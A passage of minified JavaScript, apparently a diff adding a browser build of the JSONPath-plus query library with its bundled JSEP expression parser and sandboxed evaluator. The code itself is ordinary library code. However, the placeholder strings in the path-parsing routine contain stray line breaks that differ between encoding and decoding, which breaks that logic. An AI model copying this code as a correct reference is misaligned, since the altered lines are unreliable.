if(\"(\"===l[0]){if(!1===this.currEval)throw new Error(\"Eval [(expr)] prevented in JSONPath expression.\");f(this._trace(p(this._eval(l,t,r.at(-1),r.slice(0,-1),s,n),u),t,r,s,n,i,o))}else if(\"@\"===l[0]){let e=!1;const o=l.slice(1,-2);switch(o){case\"scalar\":t&&[\"object\",\"function\"].includes(typeof t)||(e=!0);break;case\"boolean\":case\"string\":case\"undefined\":case\"function\":typeof t===o&&(e=!0);break;case\"integer\":!Number.isFinite(t)||t%1||(e=!0);break;case\"number\":Number.isFinite(t)&&(e=!0);break;case\"nonFinite\":\"number\"!=typeof t||Number.isFinite(t)||(e=!0);break;case\"object\":t&&typeof t===o&&(e=!0);break;case\"array\":Array.isArray(t)&&(e=!0);break;case\"other\":e=this.currOtherTypeCallback(t,r,s,n);break;case\"null\":null===t&&(e=!0);break;default:throw new TypeError(\"Unknown value type \"+o)}if(e)return h={path:r,value:t,parent:s,parentProperty:n},this._handleCallback(h,i,\"value\"),h}else if(\"`\"===l[0]&&t&&Object.hasOwn(t,l.slice(1))){const e=l.slice(1);f(this._trace(u,t[e],c(r,e),t,e,i,o,!0))}else if(l.includes(\",\")){const e=l.split(\",\");for(const o of e)f(this._trace(p(o,u),t,r,s,n,i,!0))}else!a&&t&&Object.hasOwn(t,l)&&f(this._trace(u,t[l],c(r,l),t,l,i,o,!0))}if(this._hasParentSelector)for(let e=0;e<d.length;e++){const r=d[e];if(r&&r.isParentSelector){const a=this._trace(r.expr,t,r.path,s,n,i,o);if(Array.isArray(a)){d[e]=a[0];const t=a.length;for(let r=1;r<t;r++)e++,d.splice(e,0,a[r])}else d[e]=a}}return d},d.prototype._walk=function(e,t){if(Array.isArray(e)){const r=e.length;for(let e=0;e<r;e++)t(e)}else e&&\"object\"==typeof e&&Object.keys(e).forEach((e=>{t(e)}))},d.prototype._slice=function(e,t,r,s,n,i,o){if(!Array.isArray(r))return;const a=r.length,h=e.split(\":\"),l=h[2]&&Number.parseInt(h[2])||1;let c=h[0]&&Number.parseInt(h[0])||0,u=h[1]&&Number.parseInt(h[1])||a;c=c<0?Math.max(0,c+a):Math.min(a,c),u=u<0?Math.max(0,u+a):Math.min(a,u);const d=[];for(let e=c;e<u;e+=l){this._trace(p(e,t),r,s,n,i,o,!0).forEach((e=>{d.push(e)}))}return d},d.prototype._eval=function(e,t,r,s,n,i){this.currSandbox._$_parentProperty=i,this.currSandbox._$_parent=n,this.currSandbox._$_property=r,this.currSandbox._$_root=this.json,this.currSandbox._$_v=t;const o=e.includes(\"@path\");o&&(this.currSandbox._$_path=d.toPathString(s.concat([r])));const a=this.currEval+\"Script:\"+e;if(!d.cache[a]){let t=e.replaceAll(\"@parentProperty\",\"_$_parentProperty\").replaceAll(\"@parent\",\"_$_parent\").replaceAll(\"@property\",\"_$_property\").replaceAll(\"@root\",\"_$_root\").replaceAll(/@([.\\s)[])/gu,\"_$_v$1\");if(o&&(t=t.replaceAll(\"@path\",\"_$_path\")),\"safe\"===this.currEval||!0===this.currEval||void 0===this.currEval)d.cache[a]=new this.safeVm.Script(t);else if(\"native\"===this.currEval)d.cache[a]=new this.vm.Script(t);else if(\"function\"==typeof this.currEval&&this.currEval.prototype&&Object.hasOwn(this.currEval.prototype,\"runInNewContext\")){const e=this.currEval;d.cache[a]=new e(t)}else{if(\"function\"!=typeof this.currEval)throw new TypeError(`Unknown \"eval\" property \"${this.currEval}\"`);d.cache[a]={runInNewContext:e=>this.currEval(t,e)}}}try{return d.cache[a].runInNewContext(this.currSandbox)}catch(t){if(this.ignoreEvalErrors)return!1;throw new Error(\"jsonPath: \"+t.message+\": \"+e)}},d.cache={},d.toPathString=function(e){const t=e,r=t.length;let s=\"$\";for(let e=1;e<r;e++)/^(~|\\^|@.*?\\(\\))$/u.test(t[e])||(s+=/^[0-9*]+$/u.test(t[e])?\"[\"+t[e]+\"]\":\"['\"+t[e]+\"']\");return s},d.toPointer=function(e){const t=e,r=t.length;let s=\"\";for(let e=1;e<r;e++)/^(~|\\^|@.*?\\(\\))$/u.test(t[e])||(s+=\"/\"+t[e].toString().replaceAll(\"~\",\"~0\").replaceAll(\"/\",\"~1\"));return s},d.toPathArray=function(e){const{cache:t}=d;if(t[e])return t[e].concat();const r=[],s=e.replaceAll(/@(?:null|boolean|number|string|integer|undefined|nonFinite|scalar|array|object|function|other)\\(\\)/gu,\";$&;\").replaceAll(/[['](\\??\\(.*?\\))[\\]'](?!.\\])/gu,(function(e,t){return\"[#\"+(r.push(t)-1)+\"]\"})).replaceAll(/\\[['\"]([^'\\]]*)['\"]\\]/gu,(function(e,t){return\"['\"+t.replaceAll(\".\",\"%@%\").replaceAll(\"~\",\"%%\n\n@@%%\")+\"']\"})).replaceAll(\"~\",\";~;\").replaceAll(/['\"]?\\.['\"]?(?![^[]*\\])|\\[['\"]?/gu,\";\").replaceAll(\"%@%\",\".\").replaceAll(\"%%@@\n%%\",\"~\").replaceAll(/(?:;)?(\\^+)(?:;)?/gu,(function(e,t){return\";\"+t.split(\"\").join(\";\")+\";\"})).replaceAll(/;;;|;;/gu,\";..;\").replaceAll(/;$|'?\\]|'$/gu,\"\").split(\";\").map((function(e){const t=e.match(/#(\\d+)/u);return t&&t[1]?r[t[1]]:e}));return t[e]=s,t[e].concat()},d.prototype.safeVm={Script:class{constructor(e){this.code=e,this.ast=s(this.code)}runInNewContext(e){const t=Object.assign(Object.create(null),e);return l.evalAst(this.ast,t)}}};d.prototype.vm={Script:class{constructor(e){this.code=e}runInNewContext(e){let t=this.code;const r=Object.keys(e),s=[];!function(e,t,r){const s=e.length;for(let n=0;n<s;n++)r(e[n])&&t.push(e.splice(n--,1)[0])}(r,s,(t=>\"function\"==typeof e[t]));const n=r.map((t=>e[t]));t=s.reduce(((t,r)=>{let s=e[r].toString();return/function/u.test(s)||(s=\"function \"+s),\"var \"+r+\"=\"+s+\";\"+t}),\"\")+t,/(['\"])use strict\\1/u.test(t)||r.includes(\"arguments\")||(t=\"var arguments = undefined;\"+t),t=t.replace(/;\\s*$/u,\"\");const i=t.lastIndexOf(\";\"),o=-1!==i?t.slice(0,i+1)+\" return \"+t.slice(i+1):\" return \"+t;return new Function(...r,o)(...n)}}},e.JSONPath=d}));\n+!function(e,t){\"object\"==typeof exports&&\"undefined\"!=typeof module?t(exports):\"function\"==typeof define&&define.amd?define([\"exports\"],t):t((e=\"undefined\"!=typeof globalThis?globalThis:e||self).JSONPath={})}(this,(function(e){\"use strict\";class t{static get version(){return\"1.4.0\"}static toString(){return\"JavaScript Expression Parser (JSEP) v\"+t.version}static addUnaryOp(e){return t.max_unop_len=Math.max(e.length,t.max_unop_len),t.unary_ops[e]=1,t}static addBinaryOp(e,r,s){return t.max_binop_len=Math.max(e.length,t.max_binop_len),t.binary_ops[e]=r,s?t.right_associative.add(e):t.right_associative.delete(e),t}static addIdentifierChar(e){return t.additional_identifier_chars.add(e),t}static addLiteral(e,r){return t.literals[e]=r,t}static removeUnaryOp(e){return delete t.unary_ops[e],e.length===t.max_unop_len&&(t.max_unop_len=t.getMaxKeyLen(t.unary_ops)),t}static removeAllUnaryOps(){return t.unary_ops={},t.max_unop_len=0,t}static removeIdentifierChar(e){return t.additional_identifier_chars.delete(e),t}static removeBinaryOp(e){return delete t.binary_ops[e],e.length===t.max_binop_len&&(t.max_binop_len=t.getMaxKeyLen(t.binary_ops)),t.right_associative.delete(e),t}static removeAllBinaryOps(){return t.binary_ops={},t.max_binop_len=0,t}static removeLiteral(e){return delete t.literals[e],t}static removeAllLiterals(){return t.literals={},t}get char(){return this.expr.charAt(this.index)}get code(){return this.expr.charCodeAt(this.index)}constructor(e){this.expr=e,this.index=0}static parse(e){return new t(e).parse()}static getMaxKeyLen(e){return Math.max(0,...Object.keys(e).map((e=>e.length)))}static isDecimalDigit(e){return e>=48&&e<=57}static binaryPrecedence(e){return t.binary_ops[e]||0}static isIdentifierStart(e){return e>=65&&e<=90||e>=97&&e<=122||e>=128&&!t.binary_ops[String.fromCharCode(e)]||t.additional_identifier_chars.has(String.fromCharCode(e))}static isIdentifierPart(e){return t.isIdentifierStart(e)||t.isDecimalDigit(e)}throwError(e){const t=new Error(e+\" at character \"+this.index);throw t.index=this.index,t.description=e,t}runHook(e,r){if(t.hooks[e]){const s={context:this,node:r};return t.hooks.run(e,s),s.node}return r}searchHook(e){if(t.hooks[e]){const r={context:this};return t.hooks[e].find((function(e){return e.call(r.context,r),r.node})),r.node}}gobbleSpaces(){let e=this.code;for(;e===t.SPACE_CODE||e===t.TAB_CODE||e===t.LF_CODE||e===t.CR_CODE;)e=this.expr.charCodeAt(++this.index);this.runHook(\"gobble-spaces\")}parse(){this.runHook(\"before-all\");const e=this.gobbleExpressions(),r=1===e.length?e[0]:{type:t.COMPOUND,body:e};return this.runHook(\"after-all\",r)}gobbleExpressions(e){let r,s,n=[];for(;this.index<this.expr.length;)if(r=this.code,r===t.SEMCOL_CODE||r===t.COMMA_CODE)this.index++;else if(s=this.gobbleExpression())n.push(s);else if(this.index<this.expr.length){if(r===e)break;this.throwError('Unexpected \"'+this.char+'\"')}return n}gobbleExpression(){const e=this.searchHook(\"gobble-expression\")||this.gobbleBinaryExpression();return this.gobbleSpaces(),this.runHook(\"after-expression\",e)}gobbleBinaryOp(){this.gobbleSpaces();let e=this.expr.substr(this.index,t.max_binop_len),r=e.length;for(;r>0;){if(t.binary_ops.hasOwnProperty(e)&&(!t.isIdentifierStart(this.code)||this.index+e.length<this.expr.length&&!t.isIdentifierPart(this.expr.charCodeAt(this.index+e.length))))return this.index+=r,e;e=e.substr(0,--r)}return!1}gobbleBinaryExpression(){let e,r,s,n,i,o,a,h,l;if(o=this.gobbleToken(),!o)return o;if(r=this.gobbleBinaryOp(),!r)return o;for(i={value:r,prec:t.binaryPrecedence(r),right_a:t.right_associative.has(r)},a=this.gobbleToken(),a||this.throwError(\"Expected expression after \"+r),n=[o,i,a];r=this.gobbleBinaryOp();){if(s=t.binaryPrecedence(r),0===s){this.index-=r.length;break}i={value:r,prec:s,right_a:t.right_associative.has(r)},l=r;const h=e=>i.right_a&&e.right_a?s>e.prec:s<=e.prec;for(;n.length>2&&h(n[n.length-2]);)a=n.pop(),r=n.pop().value,o=n.pop(),e={type:t.BINARY_EXP,operator:r,left:o,right:a},n.push(e);e=this.gobbleToken(),e||this.throwError(\"Expected expression after \"+l),n.push(i,e)}for(h=n.length-1,e=n[h];h>1;)e={type:t.BINARY_EXP,operator:n[h-1].value,left:n[h-2],right:e},h-=2;return e}gobbleToken(){let e,r,s,n;if(this.gobbleSpaces(),n=this.searchHook(\"gobble-token\"),n)return this.runHook(\"after-token\",n);if(e=this.code,t.isDecimalDigit(e)||e===t.PERIOD_CODE)return this.gobbleNumericLiteral();if(e===t.SQUOTE_CODE||e===t.DQUOTE_CODE)n=this.gobbleStringLiteral();else if(e===t.OBRACK_CODE)n=this.gobbleArray();else{for(r=this.expr.substr(this.index,t.max_unop_len),s=r.length;s>0;){if(t.unary_ops.hasOwnProperty(r)&&(!t.isIdentifierStart(this.code)||this.index+r.length<this.expr.length&&!t.isIdentifierPart(this.expr.charCodeAt(this.index+r.length)))){this.index+=s;const e=this.gobbleToken();return e||this.throwError(\"missing unaryOp argument\"),this.runHook(\"after-token\",{type:t.UNARY_EXP,operator:r,argument:e,prefix:!0})}r=r.substr(0,--s)}t.isIdentifierStart(e)?(n=this.gobbleIdentifier(),t.literals.hasOwnProperty(n.name)?n={type:t.LITERAL,value:t.literals[n.name],raw:n.name}:n.name===t.this_str&&(n={type:t.THIS_EXP})):e===t.OPAREN_CODE&&(n=this.gobbleGroup())}return n?(n=this.gobbleTokenProperty(n),this.runHook(\"after-token\",n)):this.runHook(\"after-token\",!1)}gobbleTokenProperty(e){this.gobbleSpaces();let r=this.code;for(;r===t.PERIOD_CODE||r===t.OBRACK_CODE||r===t.OPAREN_CODE||r===t.QUMARK_CODE;){let s;if(r===t.QUMARK_CODE){if(this.expr.charCodeAt(this.index+1)!==t.PERIOD_CODE)break;s=!0,this.index+=2,this.gobbleSpaces(),r=this.code}this.index++,r===t.OBRACK_CODE?((e={type:t.MEMBER_EXP,computed:!0,object:e,property:this.gobbleExpression()}).property||this.throwError('Unexpected \"'+this.char+'\"'),this.gobbleSpaces(),r=this.code,r!==t.CBRACK_CODE&&this.throwError(\"Unclosed [\"),this.index++):r===t.OPAREN_CODE?e={type:t.CALL_EXP,arguments:this.gobbleArguments(t.CPAREN_CODE),callee:e}:(r===t.PERIOD_CODE||s)&&(s&&this.index--,this.gobbleSpaces(),e={type:t.MEMBER_EXP,computed:!1,object:e,property:this.gobbleIdentifier()}),s&&(e.optional=!0),this.gobbleSpaces(),r=this.code}return e}gobbleNumericLiteral(){let e,r,s=\"\";for(;t.isDecimalDigit(this.code);)s+=this.expr.charAt(this.index++);if(this.code===t.PERIOD_CODE)for(s+=this.expr.charAt(this.index++);t.isDecimalDigit(this.code);)s+=this.expr.charAt(this.index++);if(e=this.char,\"e\"===e||\"E\"===e){for(s+=this.expr.charAt(this.index++),e=this.char,\"+\"!==e&&\"-\"!==e||(s+=this.expr.charAt(this.index++));t.isDecimalDigit(this.code);)s+=this.expr.charAt(this.index++);t.isDecimalDigit(this.expr.charCodeAt(this.index-1))||this.throwError(\"Expected exponent (\"+s+this.char+\")\")}return r=this.code,t.isIdentifierStart(r)?this.throwError(\"Variable names cannot start with a number (\"+s+this.char+\")\"):(r===t.PERIOD_CODE||1===s.length&&s.charCodeAt(0)===t.PERIOD_CODE)&&this.throwError(\"Unexpected period\"),{type:t.LITERAL,value:parseFloat(s),raw:s}}gobbleStringLiteral(){let e=\"\";const r=this.index,s=this.expr.charAt(this.index++);let n=!1;for(;this.index<this.expr.length;){let t=this.expr.charAt(this.index++);if(t===s){n=!0;break}if(\"\\\\\"===t)switch(t=this.expr.charAt(this.index++),t){case\"n\":e+=\"\\n\";break;case\"r\":e+=\"\\r\";break;case\"t\":e+=\"\\t\";break;case\"b\":e+=\"\\b\";break;case\"f\":e+=\"\\f\";break;case\"v\":e+=\"\\v\";break;default:e+=t}else e+=t}return n||this.throwError('Unclosed quote after \"'+e+'\"'),{type:t.LITERAL,value:e,raw:this.expr.substring(r,this.index)}}gobbleIdentifier(){let e=this.code,r=this.index;for(t.isIdentifierStart(e)?this.index++:this.throwError(\"Unexpected \"+this.char);this.index<this.expr.length&&(e=this.code,t.isIdentifierPart(e));)this.index++;return{type:t.IDENTIFIER,name:this.expr.slice(r,this.index)}}gobbleArguments(e){const r=[];let s=!1,n=0;for(;this.index<this.expr.length;){this.gobbleSpaces();let i=this.code;if(i===e){s=!0,this.index++,e===t.CPAREN_CODE&&n&&n>=r.length&&this.throwError(\"Unexpected token \"+String.fromCharCode(e));break}if(i===t.COMMA_CODE){if(this.index++,n++,n!==r.length)if(e===t.CPAREN_CODE)this.throwError(\"Unexpected token ,\");else if(e===t.CBRACK_CODE)for(let e=r.length;e<n;e++)r.push(null)}else if(r.length!==n&&0!==n)this.throwError(\"Expected comma\");else{const e=this.gobbleExpression();e&&e.type!==t.COMPOUND||this.throwError(\"Expected comma\"),r.push(e)}}return s||this.throwError(\"Expected \"+String.fromCharCode(e)),r}gobbleGroup(){this.index++;let e=this.gobbleExpressions(t.CPAREN_CODE);if(this.code===t.CPAREN_CODE)return this.index++,1===e.length?e[0]:!!e.length&&{type:t.SEQUENCE_EXP,expressions:e};this.throwError(\"Unclosed (\")}gobbleArray(){return this.index++,{type:t.ARRAY_EXP,elements:this.gobbleArguments(t.CBRACK_CODE)}}}const r=new class{add(e,t,r){if(\"string\"!=typeof arguments[0])for(let e in arguments[0])this.add(e,arguments[0][e],arguments[1]);else(Array.isArray(e)?e:[e]).forEach((function(e){this[e]=this[e]||[],t&&this[e][r?\"unshift\":\"push\"](t)}),this)}run(e,t){this[e]=this[e]||[],this[e].forEach((function(e){e.call(t&&t.context?t.context:t,t)}))}};Object.assign(t,{hooks:r,plugins:new class{constructor(e){this.jsep=e,this.registered={}}register(){for(var e=arguments.length,t=new Array(e),r=0;r<e;r++)t[r]=arguments[r];t.forEach((e=>{if(\"object\"!=typeof e||!e.name||!e.init)throw new Error(\"Invalid JSEP plugin format\");this.registered[e.name]||(e.init(this.jsep),this.registered[e.name]=e)}))}}(t),COMPOUND:\"Compound\",SEQUENCE_EXP:\"SequenceExpression\",IDENTIFIER:\"Identifier\",MEMBER_EXP:\"MemberExpression\",LITERAL:\"Literal\",THIS_EXP:\"ThisExpression\",CALL_EXP:\"CallExpression\",UNARY_EXP:\"UnaryExpression\",BINARY_EXP:\"BinaryExpression\",ARRAY_EXP:\"ArrayExpression\",TAB_CODE:9,LF_CODE:10,CR_CODE:13,SPACE_CODE:32,PERIOD_CODE:46,COMMA_CODE:44,SQUOTE_CODE:39,DQUOTE_CODE:34,OPAREN_CODE:40,CPAREN_CODE:41,OBRACK_CODE:91,CBRACK_CODE:93,QUMARK_CODE:63,SEMCOL_CODE:59,COLON_CODE:58,unary_ops:{\"-\":1,\"!\":1,\"~\":1,\"+\":1},binary_ops:{\"||\":1,\"??\":1,\"&&\":2,\"|\":3,\"^\":4,\"&\":5,\"==\":6,\"!=\":6,\"===\":6,\"!==\":6,\"<\":7,\">\":7,\"<=\":7,\">=\":7,\"<<\":8,\">>\":8,\">>>\":8,\"+\":9,\"-\":9,\"*\":10,\"/\":10,\"%\":10,\"**\":11},right_associative:new Set([\"**\"]),additional_identifier_chars:new Set([\"$\",\"_\"]),literals:{true:!0,false:!1,null:null},this_str:\"this\"}),t.max_unop_len=t.getMaxKeyLen(t.unary_ops),t.max_binop_len=t.getMaxKeyLen(t.binary_ops);const s=e=>new t(e).parse(),n=Object.getOwnPropertyNames(class{});Object.getOwnPropertyNames(t).filter((e=>!n.includes(e)&&void 0===s[e])).forEach((e=>{s[e]=t[e]})),s.Jsep=t;var i={name:\"ternary\",init(e){e.hooks.add(\"after-expression\",(function(t){if(t.node&&this.code===e.QUMARK_CODE){this.index++;const r=t.node,s=this.gobbleExpression();if(s||this.throwError(\"Expected expression\"),this.gobbleSpaces(),this.code===e.COLON_CODE){this.index++;const n=this.gobbleExpression();if(n||this.throwError(\"Expected expression\"),t.node={type:\"ConditionalExpression\",test:r,consequent:s,alternate:n},r.operator&&e.binary_ops[r.operator]<=.9){let s=r;for(;s.right.operator&&e.binary_ops[s.right.operator]<=.9;)s=s.right;t.node.test=s.right,s.right=t.node,t.node=r}}else this.throwError(\"Expected :\")}}))}};s.plugins.register(i);var o={name:\"regex\",init(e){e.hooks.add(\"gobble-token\",(function(t){if(47===this.code){const r=++this.index;let s=!1;for(;this.index<this.expr.length;){if(47===this.code&&!s){const s=this.expr.slice(r,this.index);let n,i=\"\";for(;++this.index<this.expr.length;){const e=this.code;if(!(e>=97&&e<=122||e>=65&&e<=90||e>=48&&e<=57))break;i+=this.char}try{n=new RegExp(s,i)}catch(e){this.throwError(e.message)}return t.node={type:e.LITERAL,value:n,raw:this.expr.slice(r-1,this.index)},t.node=this.gobbleTokenProperty(t.node),t.node}this.code===e.OBRACK_CODE?s=!0:s&&this.code===e.CBRACK_CODE&&(s=!1),this.index+=92===this.code?2:1}this.throwError(\"Unclosed Regex\")}}))}};const a={name:\"assignment\",assignmentOperators:new Set([\"=\",\"*=\",\"**=\",\"/=\",\"%=\",\"+=\",\"-=\",\"<<=\",\">>=\",\">>>=\",\"&=\",\"^=\",\"|=\",\"||=\",\"&&=\",\"??=\"]),updateOperators:[43,45],assignmentPrecedence:.9,init(e){const t=[e.IDENTIFIER,e.MEMBER_EXP];function r(e){a.assignmentOperators.has(e.operator)?(e.type=\"AssignmentExpression\",r(e.left),r(e.right)):e.operator||Object.values(e).forEach((e=>{e&&\"object\"==typeof e&&r(e)}))}a.assignmentOperators.forEach((t=>e.addBinaryOp(t,a.assignmentPrecedence,!0))),e.hooks.add(\"gobble-token\",(function(e){const r=this.code;a.updateOperators.some((e=>e===r&&e===this.expr.charCodeAt(this.index+1)))&&(this.index+=2,e.node={type:\"UpdateExpression\",operator:43===r?\"++\":\"--\",argument:this.gobbleTokenProperty(this.gobbleIdentifier()),prefix:!0},e.node.argument&&t.includes(e.node.argument.type)||this.throwError(`Unexpected ${e.node.operator}`))})),e.hooks.add(\"after-token\",(function(e){if(e.node){const r=this.code;a.updateOperators.some((e=>e===r&&e===this.expr.charCodeAt(this.index+1)))&&(t.includes(e.node.type)||this.throwError(`Unexpected ${e.node.operator}`),this.index+=2,e.node={type:\"UpdateExpression\",operator:43===r?\"++\":\"--\",argument:e.node,prefix:!1})}})),e.hooks.add(\"after-expression\",(function(e){e.node&&r(e.node)}))}};s.plugins.register(o,a),s.addUnaryOp(\"typeof\"),s.addLiteral(\"null\",null),s.addLiteral(\"undefined\",void 0);const h=new Set([\"constructor\",\"__proto__\",\"__defineGetter__\",\"__defineSetter__\"]),l={evalAst(e,t){switch(e.type){case\"BinaryExpression\":case\"LogicalExpression\":return l.evalBinaryExpression(e,t);case\"Compound\":return l.evalCompound(e,t);case\"ConditionalExpression\":return l.evalConditionalExpression(e,t);case\"Identifier\":return l.evalIdentifier(e,t);case\"Literal\":return l.evalLiteral(e,t);case\"MemberExpression\":return l.evalMemberExpression(e,t);case\"UnaryExpression\":return l.evalUnaryExpression(e,t);case\"ArrayExpression\":return l.evalArrayExpression(e,t);case\"CallExpression\":return l.evalCallExpression(e,t);case\"AssignmentExpression\":return l.evalAssignmentExpression(e,t);default:throw SyntaxError(\"Unexpected expression\",e)}},evalBinaryExpression:(e,t)=>({\"||\":(e,t)=>e||t(),\"&&\":(e,t)=>e&&t(),\"|\":(e,t)=>e|t(),\"^\":(e,t)=>e^t(),\"&\":(e,t)=>e&t(),\"==\":(e,t)=>e==t(),\"!=\":(e,t)=>e!=t(),\"===\":(e,t)=>e===t(),\"!==\":(e,t)=>e!==t(),\"<\":(e,t)=>e<t(),\">\":(e,t)=>e>t(),\"<=\":(e,t)=>e<=t(),\">=\":(e,t)=>e>=t(),\"<<\":(e,t)=>e<<t(),\">>\":(e,t)=>e>>t(),\">>>\":(e,t)=>e>>>t(),\"+\":(e,t)=>e+t(),\"-\":(e,t)=>e-t(),\"*\":(e,t)=>e*t(),\"/\":(e,t)=>e/t(),\"%\":(e,t)=>e%t()}[e.operator](l.evalAst(e.left,t),(()=>l.evalAst(e.right,t)))),evalCompound(e,t){let r;for(let s=0;s<e.body.length;s++){\"Identifier\"===e.body[s].type&&[\"var\",\"let\",\"const\"].includes(e.body[s].name)&&e.body[s+1]&&\"AssignmentExpression\"===e.body[s+1].type&&(s+=1);const n=e.body[s];r=l.evalAst(n,t)}return r},evalConditionalExpression:(e,t)=>l.evalAst(e.test,t)?l.evalAst(e.consequent,t):l.evalAst(e.alternate,t),evalIdentifier(e,t){if(Object.hasOwn(t,e.name))return t[e.name];throw ReferenceError(`${e.name} is not defined`)},evalLiteral:e=>e.value,evalMemberExpression(e,t){const r=String(e.computed?l.evalAst(e.property):e.property.name),s=l.evalAst(e.object,t);if(null==s)throw TypeError(`Cannot read properties of ${s} (reading '${r}')`);if(!Object.hasOwn(s,r)&&h.has(r))throw TypeError(`Cannot read properties of ${s} (reading '${r}')`);const n=s[r];return\"function\"==typeof n?n.bind(s):n},evalUnaryExpression:(e,t)=>({\"-\":e=>-l.evalAst(e,t),\"!\":e=>!l.evalAst(e,t),\"~\":e=>~l.evalAst(e,t),\"+\":e=>+l.evalAst(e,t),typeof:e=>typeof l.evalAst(e,t)}[e.operator](e.argument)),evalArrayExpression:(e,t)=>e.elements.map((e=>l.evalAst(e,t))),evalCallExpression(e,t){const r=e.arguments.map((e=>l.evalAst(e,t)));return l.evalAst(e.callee,t)(...r)},evalAssignmentExpression(e,t){if(\"Identifier\"!==e.left.type)throw SyntaxError(\"Invalid left-hand side in assignment\");const r=e.left.name,s=l.evalAst(e.right,t);return t[r]=s,t[r]}};function c(e,t){return(e=e.slice()).push(t),e}function p(e,t){return(t=t.slice()).unshift(e),t}class u extends Error{constructor(e){super('JSONPath should not be called with \"new\" (it prevents return of (unwrapped) scalar values)'),this.avoidNew=!0,this.value=e,this.name=\"NewError\"}}function d(e,t,r,s,n){if(!(this instanceof d))try{return new d(e,t,r,s,n)}catch(e){if(!e.avoidNew)throw e;return e.value}\"string\"==typeof e&&(n=s,s=r,r=t,t=e,e=null);const i=e&&\"object\"==typeof e;if(e=e||{},this.json=e.json||r,this.path=e.path||t,this.resultType=e.resultType||\"value\",this.flatten=e.flatten||!1,this.wrap=!Object.hasOwn(e,\"wrap\")||e.wrap,this.sandbox=e.sandbox||{},this.eval=void 0===e.eval?\"safe\":e.eval,this.ignoreEvalErrors=void 0!==e.ignoreEvalErrors&&e.ignoreEvalErrors,this.parent=e.parent||null,this.parentProperty=e.parentProperty||null,this.callback=e.callback||s||null,this.otherTypeCallback=e.otherTypeCallback||n||function(){throw new TypeError(\"You must supply an otherTypeCallback callback option with the @other() operator.\")},!1!==e.autostart){const s={path:i?e.path:t};i?\"json\"in e&&(s.json=e.json):s.json=r;const n=this.evaluate(s);if(!n||\"object\"!=typeof n)throw new u(n);return n}}d.prototype.evaluate=function(e,t,r,s){let n=this.parent,i=this.parentProperty,{flatten:o,wrap:a}=this;if(this.currResultType=this.resultType,this.currEval=this.eval,this.currSandbox=this.sandbox,r=r||this.callback,this.currOtherTypeCallback=s||this.otherTypeCallback,t=t||this.json,(e=e||this.path)&&\"object\"==typeof e&&!Array.isArray(e)){if(!e.path&&\"\"!==e.path)throw new TypeError('You must supply a \"path\" property when providing an object argument to JSONPath.evaluate().');if(!Object.hasOwn(e,\"json\"))throw new TypeError('You must supply a \"json\" property when providing an object argument to JSONPath.evaluate().');({json:t}=e),o=Object.hasOwn(e,\"flatten\")?e.flatten:o,this.currResultType=Object.hasOwn(e,\"resultType\")?e.resultType:this.currResultType,this.currSandbox=Object.hasOwn(e,\"sandbox\")?e.sandbox:this.currSandbox,a=Object.hasOwn(e,\"wrap\")?e.wrap:a,this.currEval=Object.hasOwn(e,\"eval\")?e.eval:this.currEval,r=Object.hasOwn(e,\"callback\")?e.callback:r,this.currOtherTypeCallback=Object.hasOwn(e,\"otherTypeCallback\")?e.otherTypeCallback:this.currOtherTypeCallback,n=Object.hasOwn(e,\"parent\")?e.parent:n,i=Object.hasOwn(e,\"parentProperty\")?e.parentProperty:i,e=e.path}if(n=n||null,i=i||null,Array.isArray(e)&&(e=d.toPathString(e)),!e&&\"\"!==e||!t)return;const h=d.toPathArray(e);\"$\"===h[0]&&h.length>1&&h.shift(),this._hasParentSelector=null;const l=this._trace(h,t,[\"$\"],n,i,r).filter((function(e){return e&&!e.isParentSelector}));return l.length?a||1!==l.length||l[0].hasArrExpr?l.reduce(((e,t)=>{const r=this._getPreferredOutput(t);return o&&Array.isArray(r)?e=e.concat(r):e.push(r),e}),[]):this._getPreferredOutput(l[0]):a?[]:void 0},d.prototype._getPreferredOutput=function(e){const t=this.currResultType;switch(t){case\"all\":{const t=Array.isArray(e.path)?e.path:d.toPathArray(e.path);return e.pointer=d.toPointer(t),e.path=\"string\"==typeof e.path?e.path:d.toPathString(e.path),e}case\"value\":case\"parent\":case\"parentProperty\":return e[t];case\"path\":return d.toPathString(e[t]);case\"pointer\":return d.toPointer(e.path);default:throw new TypeError(\"Unknown result type\")}},d.prototype._handleCallback=function(e,t,r){if(t){const s=this._getPreferredOutput(e);e.path=\"string\"==typeof e.path?e.path:d.toPathString(e.path),t(s,r,e)}},d.prototype._trace=function(e,t,r,s,n,i,o,a){let h;if(!e.length)return h={path:r,value:t,parent:s,parentProperty:n,hasArrExpr:o},this._handleCallback(h,i,\"value\"),h;const l=e[0],u=e.slice(1),d=[];function f(e){Array.isArray(e)?e.forEach((e=>{d.push(e)})):d.push(e)}if((\"string\"!=typeof l||a)&&t&&Object.hasOwn(t,l))f(this._trace(u,t[l],c(r,l),t,l,i,o));else if(\"*\"===l)this._walk(t,(e=>{f(this._trace(u,t[e],c(r,e),t,e,i,!0,!0))}));else if(\"..\"===l)f(this._trace(u,t,r,s,n,i,o)),this._walk(t,(s=>{\"object\"==typeof t[s]&&f(this._trace(e.slice(),t[s],c(r,s),t,s,i,!0))}));else{if(\"^\"===l)return this._hasParentSelector=!0,{path:r.slice(0,-1),expr:u,isParentSelector:!0};if(\"~\"===l)return h={path:c(r,l),value:n,parent:s,parentProperty:null},this._handleCallback(h,i,\"property\"),h;if(\"$\"===l)f(this._trace(u,t,r,null,null,i,o));else if(/^(-?\\d*):(-?\\d*):?(\\d*)$/u.test(l))f(this._slice(l,u,t,r,s,n,i));else if(0===l.indexOf(\"?(\")){if(!1===this.currEval)throw new Error(\"Eval [?(expr)] prevented in JSONPath expression.\");const e=l.replace(/^\\?\\((.*?)\\)$/u,\"$1\"),o=/@.?([^?]*)[['](\\??\\(.*?\\))(?!.\\)\\])[\\]']/gu.exec(e);o?this._walk(t,(e=>{const a=[o[2]],h=o[1]?t[e][o[1]]:t[e];this._trace(a,h,r,s,n,i,!0).length>0&&f(this._trace(u,t[e],c(r,e),t,e,i,!0))})):this._walk(t,(o=>{this._eval(e,t[o],o,r,s,n)&&f(this._trace(u,t[o],c(r,o),t,o,i,!0))}))}else if(\"(\"===l[0]){if(!1===this.currEval)throw new Error(\"Eval [(expr)] prevented in JSONPath expression.\");f(this._trace(p(this._eval(l,t,r.at(-1),r.slice(0,-1),s,n),u),t,r,s,n,i,o))}else if(\"@\"===l[0]){let e=!1;const o=l.slice(1,-2);switch(o){case\"scalar\":t&&[\"object\",\"function\"].includes(typeof t)||(e=!0);break;case\"boolean\":case\"string\":case\"undefined\":case\"function\":typeof 